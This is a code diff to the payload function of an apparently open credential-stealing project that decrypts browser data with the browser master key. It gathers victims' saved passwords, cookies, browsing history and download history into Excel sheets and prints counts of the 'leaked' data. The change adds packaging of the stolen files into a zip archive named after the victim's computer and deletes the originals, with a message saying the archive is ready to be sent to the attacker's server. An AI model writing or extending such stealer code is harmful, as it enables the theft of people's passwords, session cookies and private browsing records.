@@ -4,6 +4,7 @@ from stealer import stealer
 import openpyxl
 import os
 import time
+import zipfile
 
 # Create an Excel file
 def createExcelFile(filename:str) -> openpyxl.Workbook:
@@ -94,21 +95,30 @@ def payload():
                 victim.getMasterKey(victim.browserPath[browser]),
                 lufevre.extractDownloadHistory
             )
+
             header = ["CurrentPath", "TargetPath", "Referrer", "StartTime", "EndTime", "TotalBytes", 
-                        "LastAccessTime", "MIMEType", "State", "DangerType", "InterruptReason"]
+                "LastAccessTime", "MIMEType", "State", "DangerType", "InterruptReason"]
             data = [[currentPath, downloadHistory[currentPath]["targetPath"], downloadHistory[currentPath]["referrer"],
-                    downloadHistory[currentPath]["startTime"], downloadHistory[currentPath]["endTime"], downloadHistory[currentPath]["totalBytes"],
-                    downloadHistory[currentPath]["lastAccessTime"], downloadHistory[currentPath]["mimeType"], downloadHistory[currentPath]["state"],
-                    downloadHistory[currentPath]["dangerType"], downloadHistory[currentPath]["interruptReason"]] for currentPath in downloadHistory]
+                downloadHistory[currentPath]["startTime"], downloadHistory[currentPath]["endTime"], downloadHistory[currentPath]["totalBytes"],
+                downloadHistory[currentPath]["lastAccessTime"], downloadHistory[currentPath]["mimeType"], downloadHistory[currentPath]["state"],
+                downloadHistory[currentPath]["dangerType"], downloadHistory[currentPath]["interruptReason"]] for currentPath in downloadHistory]
             writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "DownloadHistory", header, data)
 
-            print(f"[+] => User password information leaked---------amount: {len(credential):-8} row(s)")
-            print(f"[+] => User webpage access history leaked-------amount: {len(history):-8} row(s)")
-            print(f"[+] => User webpage access statistics leaked----amount: {len(visitedLink):-8} row(s)")
-            print(f"[+] => User cookie leaked-----------------------amount: {len(cookie):-8} row(s)")
-            print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):-8} row(s)")
+            print(f"[+] => User password information leaked---------amount: {len(credential):8,} row(s)")
+            print(f"[+] => User webpage access history leaked-------amount: {len(history):8,} row(s)")
+            print(f"[+] => User webpage access statistics leaked----amount: {len(visitedLink):8,} row(s)")
+            print(f"[+] => User cookie leaked-----------------------amount: {len(cookie):8,} row(s)")
+            print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):8,} row(s)")
 
-    print("[+] Information extraction completed")
+    # Zip the created excel files
+    print("[+] Zipping the created excel files")
+    for file in os.listdir():
+        if file.endswith(".xlsx"):
+            with zipfile.ZipFile(f"{os.environ['COMPUTERNAME']}_BrowserInformation.zip", "a") as zipFile:
+                zipFile.write(file)
+                os.remove(file)
+
+    print("[+] Process completed, the excel files are zipped and ready to be sent to the attacker's server")
 
 if __name__ == "__main__":
     while True:
